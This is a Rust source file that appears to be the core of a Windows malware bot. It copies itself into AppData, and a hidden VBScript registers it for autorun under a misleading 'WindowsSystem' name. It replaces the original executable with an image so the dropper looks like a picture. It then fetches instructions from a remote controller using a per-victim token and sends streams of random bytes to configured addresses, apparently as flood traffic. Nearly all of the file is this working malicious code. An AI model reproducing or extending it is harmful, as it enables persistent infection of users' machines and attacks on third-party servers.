#![allow(dead_code)]
pub mod config;
pub mod connection;
mod image_placeholder;
pub mod macros;
pub mod response;
mod util;

use config::{parse_config, AppConfig, ControllerConfig};
use connection::create_stream;
use response::Response;
use std::{env, error, fs, io::Read, io::Write, net::TcpStream};
use util::gen_random_byte;

static BODY_SEPARATOR: &str = "\r\n\r\n";
static MAX_BUFFER_CHUNK_SIZE: u32 = 1024;
static CONFIG_DECRYPT_CHAR_LEFT_SHIFT: u8 = 13;

pub type Result<T> = std::result::Result<T, Box<dyn error::Error>>;

#[cfg(target_os = "windows")]
pub fn setup() -> Result<()> {
  use rand::Rng;
  use rand::{distributions::Alphanumeric, thread_rng};
  use std::{
    process::{exit, Command},
    thread,
    time::Duration,
  };
  let home_path = env::home_dir().unwrap().display().to_string();
  let current_path = std::env::current_exe().unwrap().display().to_string();
  let target_path = home_path.clone() + "\\AppData\\Local\\ibreq.exe";
  let vbs_path = home_path.clone() + "\\AppData\\Local\\ibreq.vbs";
  let conf_path = home_path.clone() + "\\AppData\\Local\\ibreq.conf";
  let token: String = thread_rng().sample_iter(&Alphanumeric).take(32).collect();

  if current_path == target_path {
    loop {
      let conf = get_app_config().unwrap();
      let new_path = conf.original_path.replace(".exe", "");

      // Replacing with image;
      match fs::write(&new_path, image_placeholder::get_placeholder_buf()) {
        Ok(_) => break,
        Err(_) => {
          thread::sleep(Duration::from_millis(10));
          continue;
        }
      }
    }
    return Ok(());
  }

  fs::copy(&current_path, &target_path).unwrap();

  // Run add and register as autorun
  let vbs_content = format!(
    r#"
    Set oShell = CreateObject("Wscript.Shell")
    oShell.Run "cmd /c {target_path}", 0, false
    oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsSystem","{target_path}","REG_SZ"
  "#,
    target_path = target_path
  );
  fs::write(&vbs_path, &vbs_content).unwrap();
  Command::new("wscript").arg(&vbs_path).output().unwrap();
  fs::remove_file(&vbs_path).unwrap();

  // Create config file
  let conf_content = format!(
    r#"
    original_path={};
    token={};
    "#,
    current_path, token,
  );
  fs::write(&conf_path, &conf_content).unwrap();

  exit(0);
}

#[cfg(not(target_os = "windows"))]
pub fn setup() -> Result<()> {
  todo!();
}

pub fn fetch_controller_config(addr: &str) -> Result<ControllerConfig> {
  let app_conf = get_app_config().unwrap_or_default();
  let headers = format!(
    "GET / HTTP/1.1\nAccept: */*\nx-client-token: {}{}",
    app_conf.token, BODY_SEPARATOR
  );
  let mut res = String::new();
  let mut stream = TcpStream::connect(addr)?;

  stream.write(&headers.as_bytes())?;
  stream.read_to_string(&mut res)?;

  let res: Response = Response::from(res);

  let conf = parse_config(&res.decrypted_body());
  let conf = ControllerConfig::from(conf);

  debug!("Done fetching config {:?}.", conf);

  Ok(conf)
}

pub fn get_app_config() -> Result<AppConfig> {
  let home_path = env::home_dir().unwrap().display().to_string();
  let conf_path = home_path.clone() + "\\AppData\\Local\\ibreq.conf";
  let conf = parse_config(&fs::read_to_string(&conf_path)?);
  let conf = AppConfig::from(conf);

  Ok(conf)
}

pub fn call(conf: &ControllerConfig) -> Result<Response> {
  let mut stream = create_stream(&conf);
  let body: Vec<u8> = vec![0; conf.content_length as usize]
    .iter()
    .map(|_| gen_random_byte())
    .collect();
  let mut res = String::new();

  stream.w(conf.headers.as_bytes())?;
  stream.w("\n\n".as_bytes())?;

  if conf.content_length > MAX_BUFFER_CHUNK_SIZE {
    for chunk in body.chunks(MAX_BUFFER_CHUNK_SIZE as usize) {
      stream.w(&chunk)?;
    }
  } else {
    stream.w(&body)?;
  }

  stream.w(&[0; 1])?;
  stream.r(&mut res)?;

  debug!("Done calling {}...", conf.get_addr());

  return Ok(Response::from(res));
}
